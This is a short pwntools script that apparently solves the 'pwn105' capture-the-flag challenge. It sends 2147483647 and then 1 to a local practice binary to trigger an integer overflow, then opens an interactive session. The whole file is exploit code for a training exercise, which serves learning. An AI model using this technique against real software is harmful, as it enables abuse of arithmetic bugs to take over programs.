from pwn import *

context.binary = binary = ELF("./pwn105.pwn105")

p = process()
#p = remote("IP", port)
#context.log_level = "debug"
#p.recv()


#gdb attach(p """
#br main
#c
#""")

payload1 = b"2147483647"
#payload1 = b"5"
payload2 = b"1"

output = p.recvuntil(b"]>>")
#p.recv()

#p.recv()
p.sendline(payload1)
p.sendline(payload2)

p.interactive()
